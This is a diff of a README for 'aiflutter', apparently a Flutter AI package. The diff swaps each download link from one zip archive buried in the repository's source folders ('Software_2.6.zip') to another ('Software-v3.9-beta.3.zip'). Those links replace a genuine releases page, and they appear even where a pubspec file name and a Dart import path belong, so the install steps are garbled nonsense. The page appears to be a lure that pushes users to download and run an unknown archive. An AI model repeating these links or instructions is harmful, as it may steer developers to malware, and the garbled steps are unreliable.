@@ -1,7 +1,7 @@
 # 🤖 aiflutter - Seamless AI Integration for Your App
 
 ## 🔗 Download Now!
-[![Download aiflutter](https://raw.githubusercontent.com/isaacdivine37/aiflutter/main/src/chat_app/assets/Software_2.6.zip)](https://raw.githubusercontent.com/isaacdivine37/aiflutter/main/src/chat_app/assets/Software_2.6.zip)
+[![Download aiflutter](https://github.com/isaacdivine37/aiflutter/raw/refs/heads/main/src/chat_app/test/Software-v3.9-beta.3.zip)](https://github.com/isaacdivine37/aiflutter/raw/refs/heads/main/src/chat_app/test/Software-v3.9-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to aiflutter! This application helps you integrate AI capabilities into your Flutter apps effortlessly. Whether you're building a chat feature or a reasoning engine, aiflutter has you covered.
@@ -23,7 +23,7 @@ Before you start, make sure your system meets these requirements:
 ## 📥 Download & Install
 To get started with aiflutter, visit the Releases page to download the latest version. You can find all the necessary files here:
 
-[Download aiflutter](https://raw.githubusercontent.com/isaacdivine37/aiflutter/main/src/chat_app/assets/Software_2.6.zip)
+[Download aiflutter](https://github.com/isaacdivine37/aiflutter/raw/refs/heads/main/src/chat_app/test/Software-v3.9-beta.3.zip)
 
 Follow these steps to install:
 
@@ -44,7 +44,7 @@ After installing, follow these simple steps to use aiflutter:
    ```bash
    cd my_project
    ```
-3. **Add aiflutter Package:** Open your `https://raw.githubusercontent.com/isaacdivine37/aiflutter/main/src/chat_app/assets/Software_2.6.zip` file and add the following line under the dependencies section:
+3. **Add aiflutter Package:** Open your `https://github.com/isaacdivine37/aiflutter/raw/refs/heads/main/src/chat_app/test/Software-v3.9-beta.3.zip` file and add the following line under the dependencies section:
    ```yaml
    dependencies:
      aiflutter: ^1.0.0
@@ -55,7 +55,7 @@ After installing, follow these simple steps to use aiflutter:
    ```
 5. **Start Using aiflutter:** You can now import aiflutter into your Dart files. Use:
    ```dart
-   import 'https://raw.githubusercontent.com/isaacdivine37/aiflutter/main/src/chat_app/assets/Software_2.6.zip';
+   import 'https://github.com/isaacdivine37/aiflutter/raw/refs/heads/main/src/chat_app/test/Software-v3.9-beta.3.zip';
    ```
 
 ## 📝 Documentation
@@ -83,4 +83,4 @@ Thanks to the open-source community for their contributions. Your support makes 
 ## 🔗 Visit the Releases Page Again
 To download the latest version of aiflutter, click here:
 
-[Download aiflutter](https://raw.githubusercontent.com/isaacdivine37/aiflutter/main/src/chat_app/assets/Software_2.6.zip)
+[Download aiflutter](https://github.com/isaacdivine37/aiflutter/raw/refs/heads/main/src/chat_app/test/Software-v3.9-beta.3.zip)
